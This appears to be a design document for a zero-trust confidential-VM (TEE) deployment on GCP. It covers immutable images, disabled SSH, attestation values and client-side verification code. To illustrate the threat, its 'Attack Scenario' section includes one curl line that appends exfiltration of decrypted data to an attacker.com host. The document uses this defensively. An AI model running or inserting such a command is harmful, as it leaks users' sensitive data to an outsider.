# Zero-Trust TEE Deployment

## Problem: Why Startup Scripts Violate Zero-Trust

**The Original Approach** (using startup scripts in `deploy_shared_tee.sh`):

```bash
gcloud compute instances create shared-tee \
    --metadata-from-file=startup-script=/tmp/tee-startup.sh
```

**Critical Security Flaws:**

1. **Arbitrary Code Injection**: Anyone with `gcloud` access can modify the startup script before deployment
2. **No Code Verification**: Clients cannot verify what code is actually running in the TEE
3. **SSH Access**: VMs typically have SSH enabled, allowing post-deployment modification
4. **Mutable Runtime**: Administrators can SSH in and change the running code
5. **No Attestation Chain**: The TEE cannot prove it's running specific audited code

**Attack Scenario:**
```bash
# Malicious insider modifies startup script
echo "curl http://attacker.com?data=\$DECRYPTED_DATA" >> /tmp/tee-startup.sh

# Deploys compromised TEE
./deploy_shared_tee.sh

# Victims upload sensitive data to compromised TEE
# Attacker exfiltrates plaintext data
```

## Solution: Immutable Image-Based Deployment

### Architecture Overview

```
┌─────────────────────────────────────────────────────────────┐
│                   Zero-Trust TEE Deployment                  │
└─────────────────────────────────────────────────────────────┘

1. BUILD PHASE (Auditable)
   ┌──────────────────┐
   │  Source Code     │ ─────┐
   │  (Git Commit)    │      │
   └──────────────────┘      │
                             ├──> build_tee_image.sh
   ┌──────────────────┐      │
   │  Dependencies    │ ─────┘
   │  (Pinned)        │
   └──────────────────┘
           │
           ▼
   ┌──────────────────────────────┐
   │  Immutable GCP Image         │
   │  • Code baked in             │
   │  • RSA keys generated        │
   │  • SSH disabled              │
   │  • Code hash computed        │
   │  ID: IMAGE_ID_12345          │
   └──────────────────────────────┘

2. DEPLOYMENT PHASE (Reproducible)
   └──> deploy_tee_from_image.sh
   
   ┌──────────────────────────────┐
   │  Confidential VM             │
   │  • Uses approved image       │
   │  • No external IP            │
   │  • No SSH access             │
   │  • Secure boot + vTPM        │
   │  • AMD SEV-SNP encryption    │
   └──────────────────────────────┘

3. VERIFICATION PHASE (Client-Side)
   
   Client fetches: /attestation
   
   ┌──────────────────────────────┐
   │  Attestation Token           │
   │  {                           │
   │    "image_id": "12345",      │ ◄─ Verify matches approved
   │    "code_hash": "abc...",    │ ◄─ Verify matches audit
   │    "public_key": "...",      │ ◄─ Use for encryption
   │    "ssh_disabled": true,     │ ◄─ Verify immutability
   │    "signature": "..."        │ ◄─ Verify with TEE key
   │  }                           │
   └──────────────────────────────┘
           │
           ▼
   ONLY upload data if all checks pass
```

### Zero-Trust Properties Achieved

| Property | How It's Enforced |
|----------|-------------------|
| **Immutable Code** | Code baked into image, cannot be modified at runtime |
| **Verifiable Builds** | Image ID + code hash allow clients to verify exact code |
| **No Privileged Access** | SSH disabled in image, no root access possible |
| **Reproducible** | Build script uses pinned dependencies, deterministic |
| **Auditable** | Git commit hash stored in image metadata |
| **Hardware Isolation** | AMD SEV-SNP encrypts VM memory from hypervisor |
| **Measured Boot** | vTPM + Secure Boot verify boot chain integrity |
| **Remote Attestation** | Clients verify TEE properties before uploading |

## Implementation

### Step 1: Build Immutable Image

```bash
cd /Users/dbrown/Development/permissible/web_api/scripts
./build_tee_image.sh
```

**What This Does:**

1. Creates temporary VM
2. Installs Python + dependencies with **pinned versions**
3. Copies TEE server code from `workers/tee_server.py`
4. Generates RSA-4096 keypair **inside the image**
5. Computes SHA-256 hash of all code files
6. **Disables SSH completely**
7. Creates systemd service for auto-start
8. Saves image with unique ID

**Output:**
```
Image Name: permissible-tee-20251129-143022
Image ID: 1234567890123456789
Code Hash: sha256:abc123def456...
```

**Critical: Publish these values for client verification**

### Step 2: Deploy TEE from Image

```bash
./deploy_tee_from_image.sh shared-tee-prod
```

**What This Does:**

1. Deploys Confidential VM from approved image
2. **No external IP** (internal network only)
3. **No SSH access** (already disabled in image)
4. Enables confidential computing (AMD SEV-SNP)
5. Enables secure boot + vTPM
6. Blocks project-wide SSH keys

**Zero-Trust Configuration:**
```bash
gcloud compute instances create shared-tee-prod \
    --image="permissible-tee-20251129-143022" \
    --confidential-compute-type=SEV \
    --shielded-secure-boot \
    --shielded-vtpm \
    --no-address \                          # No external IP
    --metadata=block-project-ssh-keys=true  # No SSH keys
```

### Step 3: Client Verification

Before uploading any data, clients **MUST** verify:

```javascript
// 1. Fetch attestation
const response = await fetch(`${TEE_ENDPOINT}/attestation`);
const { attestation, signature } = await response.json();

// 2. Verify image ID matches approved value
const APPROVED_IMAGE_ID = "1234567890123456789"; // From audit
if (attestation.image_id !== APPROVED_IMAGE_ID) {
    throw new Error("TEE is running unapproved image!");
}

// 3. Verify code hash matches audited source
const APPROVED_CODE_HASH = "sha256:abc123def456..."; // From audit
if (attestation.code_measurement !== APPROVED_CODE_HASH) {
    throw new Error("TEE code does not match audit!");
}

// 4. Verify SSH is disabled
if (attestation.ssh_disabled !== true) {
    throw new Error("TEE allows SSH access - not zero-trust!");
}

// 5. Verify confidential computing is enabled
if (attestation.confidential_computing !== true) {
    throw new Error("Confidential computing not enabled!");
}

// 6. Verify attestation signature
const isValid = await verifySignature(
    attestation,
    signature,
    attestation.public_key
);
if (!isValid) {
    throw new Error("Attestation signature invalid!");
}

// Only now is it safe to upload
await uploadEncryptedData(attestation.public_key, data);
```

## Security Guarantees

### What Zero-Trust Prevents

✅ **Malicious Startup Scripts**: Code is in image, not injectable scripts  
✅ **SSH Backdoors**: SSH completely disabled at image build time  
✅ **Runtime Modifications**: Image is immutable, no way to change code  
✅ **Insider Threats**: Even admins cannot access running TEE  
✅ **Unaudited Updates**: Clients verify exact image ID before trusting  
✅ **Data Exfiltration**: No network access except defined endpoints  

### Attack Resistance

| Attack Vector | Mitigation |
|--------------|------------|
| Admin SSHs into TEE | SSH disabled in image, systemd removes sshd |
| Admin modifies image | Client verifies image_id in attestation |
| Developer deploys wrong image | Client verifies code_hash in attestation |
| Malicious startup script | No startup scripts used, code in image |
| Hypervisor memory access | AMD SEV-SNP encrypts all VM memory |
| Boot-time code injection | Secure boot + vTPM verify boot chain |
| Network-based exfiltration | No external IP, internal firewall rules |

### Threat Model

**Trusted:**
- AMD SEV-SNP hardware implementation
- GCP Confidential VM hypervisor (with encrypted memory)
- vTPM and measured boot mechanism
- Client-side verification logic

**NOT Trusted:**
- GCP project administrators
- Cloud platform operators
- Network infrastructure
- Anyone with SSH/console access (prevented)
- Startup scripts (not used)
- Runtime configuration (immutable)

## Deployment Workflow

### For System Administrators

```bash
# 1. Audit source code
cd /Users/dbrown/Development/permissible
git checkout main
git log --oneline -1  # Note commit hash

# 2. Review TEE server code
cat workers/tee_server.py  # Audit for security issues

# 3. Build immutable image
cd web_api/scripts
./build_tee_image.sh

# 4. Record image ID and code hash for publication
IMAGE_ID=$(gcloud compute images describe-from-family permissible-tee \
    --format="get(id)")
echo "Approved Image ID: $IMAGE_ID"

# 5. Deploy TEE instance
./deploy_tee_from_image.sh shared-tee-prod

# 6. Publish attestation values
echo "CODE_HASH=..." >> /path/to/public/attestation-values.txt
echo "IMAGE_ID=$IMAGE_ID" >> /path/to/public/attestation-values.txt
```

### For Application Developers

Update your web application to use internal TEE endpoint:

```bash
# .env
TEE_ENDPOINT=http://10.128.0.5:8080  # Internal IP only
APPROVED_IMAGE_ID=1234567890123456789
APPROVED_CODE_HASH=sha256:abc123def456...
```

### For Data Contributors

Your upload page should show verification results:

```
🔒 TEE Security Verification
✓ Running approved image (ID: 12345...)
✓ Code matches audit (hash: abc123...)
✓ SSH disabled (immutable)
✓ Confidential computing enabled
✓ Attestation signature valid

Safe to upload your data.
```

## Updating TEE Code

**Problem:** How do you update TEE code without violating zero-trust?

**Solution:** Build new image, publish new attestation values

```bash
# 1. Update code in git
git commit -m "Fix: Updated query executor"
git push

# 2. Build NEW image (gets new ID)
./build_tee_image.sh
# Output: permissible-tee-20251130-091500
# Image ID: 9876543210987654321

# 3. PUBLISH new approved values
cat > APPROVED_TEE_VERSIONS.md <<EOF
## Approved TEE Images

### Version 2024-11-30
- Image ID: 9876543210987654321
- Code Hash: sha256:def789ghi012...
- Git Commit: abc123
- Changes: Fixed query executor bug

### Version 2024-11-29 (deprecated)
- Image ID: 1234567890123456789
- Status: Deprecated, migrate to new version
EOF

# 4. Update client verification
# Clients will reject old image automatically

# 5. Deploy new instance
./deploy_tee_from_image.sh shared-tee-prod-v2

# 6. Update load balancer to point to new instance

# 7. Decommission old instance after migration period
```

## Network Architecture

```
┌──────────────────────────────────────────────────────────┐
│                    VPC Network                            │
│                                                           │
│  ┌─────────────────┐                                     │
│  │  Web Server     │                                     │
│  │  (External IP)  │──┐                                  │
│  └─────────────────┘  │                                  │
│                       │  Internal                        │
│  ┌─────────────────┐  │  Network                        │
│  │  Client Browser │  │  Only                           │
│  │  (Public)       │  │                                  │
│  └─────────────────┘  │                                  │
│         │             │                                  │
│         │             ▼                                  │
│         │      ┌─────────────────┐                      │
│         │      │  TEE Instance   │                      │
│         │      │  10.128.0.5     │                      │
│         │      │  (No Ext. IP)   │                      │
│         │      │  (No SSH)       │                      │
│         │      └─────────────────┘                      │
│         │             │                                  │
│         │             │ Cloud NAT                        │
│         │             │ (Outbound only)                  │
│         │             ▼                                  │
│         │      [Internet for callbacks]                 │
│         │                                                │
│         └─> Direct upload via CORS proxy                │
│                                                           │
└──────────────────────────────────────────────────────────┘
```

**Key Points:**
- TEE has **no external IP** (cannot be reached from internet)
- Clients upload through **web server CORS proxy**
- TEE uses **Cloud NAT for outbound** callbacks only
- All access is **internal network only**

## FAQ

### Q: Can I SSH into the TEE to debug issues?

**A: No.** That would violate zero-trust. Instead:
- View logs via Cloud Logging (read-only)
- Add debug endpoints that return non-sensitive metrics
- Deploy a new test image with debug logging enabled

### Q: How do I rotate the RSA keys?

**A: Build a new image.** Keys are baked into the image. To rotate:
1. Build new image (generates new keys)
2. Publish new image_id
3. Deploy new instance
4. Clients automatically use new public key from attestation

### Q: What if there's a critical security bug?

**A: Hot-fix process:**
1. Fix code in git
2. Build emergency image
3. Publish new image_id with "CRITICAL" tag
4. Force all clients to upgrade (reject old image_id)
5. Deploy new TEE immediately
6. Coordinate with data contributors to re-upload

### Q: Can GCP support access the TEE?

**A: They cannot access plaintext.** AMD SEV-SNP encrypts all VM memory with a key only the CPU knows. GCP cannot:
- Read memory
- Read CPU registers
- Inspect running processes
- Decrypt data inside TEE

They CAN:
- Stop/start the VM
- See network traffic (but it's encrypted)
- Delete the instance
- View logs (if you send plaintext to logs - don't!)

### Q: How do I verify the build is reproducible?

```bash
# Build image twice
./build_tee_image.sh > build1.log
sleep 1
./build_tee_image.sh > build2.log

# Compare code hashes
IMAGE1=$(grep "Code Hash:" build1.log | cut -d: -f2-)
IMAGE2=$(grep "Code Hash:" build2.log | cut -d: -f2-)

if [ "$IMAGE1" = "$IMAGE2" ]; then
    echo "✓ Builds are reproducible"
else
    echo "✗ Builds differ - investigate!"
fi
```

## Production Checklist

Before trusting a TEE in production:

- [ ] Source code audited by security team
- [ ] Image built from audited commit
- [ ] Image ID and code hash published to clients
- [ ] SSH completely disabled in image
- [ ] No external IP assigned to instance
- [ ] Confidential computing (SEV-SNP) enabled
- [ ] Secure boot + vTPM enabled
- [ ] Client verification code deployed
- [ ] Network firewall rules restrict access
- [ ] Cloud Logging configured for audit trail
- [ ] Incident response plan for compromised TEE
- [ ] Key rotation procedure documented
- [ ] Emergency update process tested

## References

- [AMD SEV-SNP Whitepaper](https://www.amd.com/system/files/TechDocs/SEV-SNP-strengthening-vm-isolation-with-integrity-protection-and-more.pdf)
- [GCP Confidential VMs](https://cloud.google.com/confidential-computing)
- [IACR Cryptology ePrint Archive](https://eprint.iacr.org/) - Zero-trust architecture papers
- [NIST SP 800-207](https://csrc.nist.gov/publications/detail/sp/800-207/final) - Zero Trust Architecture

## Conclusion

**Key Principle:** Never trust runtime configuration. Trust only what can be cryptographically verified.

The immutable image approach ensures:
1. ✅ Clients can verify exact code running
2. ✅ No administrator can modify TEE
3. ✅ Reproducible, auditable builds
4. ✅ True zero-trust architecture

**Previous approach:** "Trust me, I deployed the right code"  
**New approach:** "Prove to me via attestation you're running audited code, or I won't upload"
